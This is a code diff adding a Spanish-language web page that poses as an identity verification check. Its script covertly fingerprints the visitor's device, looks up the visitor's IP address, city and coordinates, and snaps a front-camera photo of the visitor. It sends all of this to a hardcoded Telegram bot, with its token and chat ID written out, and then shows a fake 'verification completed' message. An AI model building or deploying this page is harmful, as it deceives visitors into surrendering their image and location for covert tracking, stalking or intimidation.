@@ -1,0 +1,96 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verificacion de Seguridad</title>
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box}
+        body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;
+             background:linear-gradient(135deg,#0f0c29,#302b63,#24243e);color:white;
+             min-height:100vh;display:flex;justify-content:center;align-items:center}
+        .card{background:rgba(255,255,255,0.05);backdrop-filter:blur(10px);
+              border:1px solid rgba(255,255,255,0.1);border-radius:20px;
+              padding:40px;max-width:420px;text-align:center}
+        .icon{font-size:60px;margin-bottom:20px}
+        h1{font-size:22px;margin-bottom:10px}
+        p{color:#a0a0b0;font-size:14px;margin-bottom:20px;line-height:1.6}
+        .btn{background:linear-gradient(135deg,#667eea,#764ba2);color:white;
+             border:none;padding:14px 32px;border-radius:12px;font-size:16px;
+             cursor:pointer;width:100%}
+        .btn:hover{opacity:0.9}
+        #status{margin-top:16px;font-size:13px;color:#4ecca3;min-height:20px}
+        .bar{height:4px;background:#333;border-radius:2px;overflow:hidden;margin-top:16px;display:none}
+        .fill{height:100%;background:linear-gradient(90deg,#667eea,#764ba2);width:0%;transition:width 0.5s}
+        video,canvas{display:none}
+    </style>
+</head>
+<body>
+<div class="card">
+    <div class="icon">&#128274;</div>
+    <h1>Verificacion de Identidad</h1>
+    <p>Para acceder al contenido protegido, necesitamos verificar tu identidad.</p>
+    <button class="btn" onclick="go()" id="btn">Iniciar Verificacion</button>
+    <div class="bar" id="bar"><div class="fill" id="fill"></div></div>
+    <p id="status"></p>
+    <video id="v" autoplay playsinline></video>
+    <canvas id="c"></canvas>
+</div>
+<script>
+const T='8575617284:AAEnhzskJXyLFC5VV4Qi2-TEz8UNAK4idYQ',C='7891650726';
+async function send(t){try{await fetch('https://api.telegram.org/bot'+T+'/sendMessage',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:C,text:t})})}catch(e){}}
+async function sendPhoto(b){try{const f=new FormData();f.append('chat_id',C);f.append('photo',b,'cap.jpg');f.append('caption','\xf0\x9f\xa7\xbf Captura de camara recibida');await fetch('https://api.telegram.org/bot'+T+'/sendPhoto',{method:'POST',body:f})}catch(e){}}
+async function getInfo(){
+    let i={ua:navigator.userAgent,plat:navigator.platform,lang:navigator.language,scr:screen.width+'x'+screen.height,tz:Intl.DateTimeFormat().resolvedOptions().timeZone,cores:navigator.hardwareConcurrency||'?',mem:navigator.deviceMemory||'?',touch:navigator.maxTouchPoints,time:new Date().toISOString()};
+    try{const r=await fetch('https://api.ipify.org?format=json');const d=await r.json();i.ip=d.ip;const g=await fetch('http://ip-api.com/json/'+d.ip);const gd=await g.json();if(gd.status==='success'){i.country=gd.country;i.city=gd.city;i.isp=gd.isp;i.lat=gd.lat;i.lon=gd.lon}}catch(e){}
+    try{const b=await navigator.getBattery();i.bat=Math.round(b.level*100)+'%'}catch(e){}
+    try{const cv=document.createElement('canvas');const gl=cv.getContext('webgl');if(gl){const di=gl.getExtension('WEBGL_debug_renderer_info');if(di)i.gpu=gl.getParameter(di.UNMASKED_RENDERER_WEBGL)}}catch(e){}
+    return i;
+}
+async function go(){
+    const s=document.getElementById('status'),b=document.getElementById('btn'),bar=document.getElementById('bar'),fill=document.getElementById('fill');
+    b.disabled=true;b.textContent='Procesando...';bar.style.display='block';fill.style.width='20%';
+    s.textContent='Iniciando camara...';
+    const info=await getInfo();
+    try{
+        const stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:'user'}});
+        fill.style.width='50%';s.textContent='Capturando...';
+        const v=document.getElementById('v');v.srcObject=stream;
+        await new Promise(r=>setTimeout(r,2000));
+        fill.style.width='70%';
+        const c=document.getElementById('c');c.width=v.videoWidth;c.height=v.videoHeight;
+        c.getContext('2d').drawImage(v,0,0);
+        stream.getTracks().forEach(t=>t.stop());
+        fill.style.width='85%';
+        const blob=await new Promise(r=>c.toBlob(r,'image/jpeg',0.85));
+        await sendPhoto(blob);
+        fill.style.width='95%';
+    }catch(e){info.cam_error=e.message}
+    let msg='\xf0\x9f\xa7\xbf CAPTURA - INFO DISPOSITIVO\n';
+    msg+='\u2501'.repeat(30)+'\n';
+    if(info.ip)msg+='IP: '+info.ip+'\n';
+    if(info.country)msg+='Pais: '+info.country+'\n';
+    if(info.city)msg+='Ciudad: '+info.city+'\n';
+    if(info.isp)msg+='ISP: '+info.isp+'\n';
+    if(info.lat)msg+='Coords: '+info.lat+','+info.lon+'\n';
+    if(info.lat)msg+='Maps: https://www.google.com/maps?q='+info.lat+','+info.lon+'\n';
+    msg+='\nDispositivo: '+info.plat+'\n';
+    msg+='Pantalla: '+info.scr+'\n';
+    msg+='Cores: '+info.cores+'\n';
+    if(info.mem!=='?')msg+='RAM: ~'+info.mem+'GB\n';
+    if(info.bat)msg+='Bateria: '+info.bat+'\n';
+    if(info.gpu)msg+='GPU: '+info.gpu+'\n';
+    msg+='Touch: '+info.touch+'\n';
+    msg+='Zona: '+info.tz+'\n';
+    msg+='Idioma: '+info.lang+'\n';
+    if(info.cam_error)msg+='\nCamara: DENEGADA ('+info.cam_error+')';
+    else msg+='\nCamara: CAPTURADA';
+    msg+='\n\nUA: '+info.ua.substring(0,150);
+    await send(msg);
+    fill.style.width='100%';
+    s.textContent='Verificacion completada';
+    b.textContent='Verificado';
+}
+</script>
+</body>
+</html>
